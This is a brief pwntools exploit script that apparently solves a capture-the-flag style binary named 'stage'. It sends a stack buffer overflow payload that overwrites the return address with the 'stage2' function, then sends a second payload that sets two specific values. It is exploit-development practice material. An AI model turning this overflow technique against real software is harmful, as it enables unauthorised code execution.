from pwn import*
context.log_level = 'debug'
p = process("./stage")
e = ELF("./stage")

#gdb.attach(p)

stage2 = e.symbols['stage2']

log.info("stage2 : " + hex(stage2) )
p.recvuntil(b'Attack me.\n')

pay = b"A"* 0x81
pay += b"B" * 4
pay += p32(e.symbols['stage2'])

p.sendline(pay)

p.recvuntil(b'Attack me: ')

pay = b"A"*16
pay += p32(0xaaaabbbb)
pay += p32(0xcafebabe)

p.sendline(pay)

p.interactive()
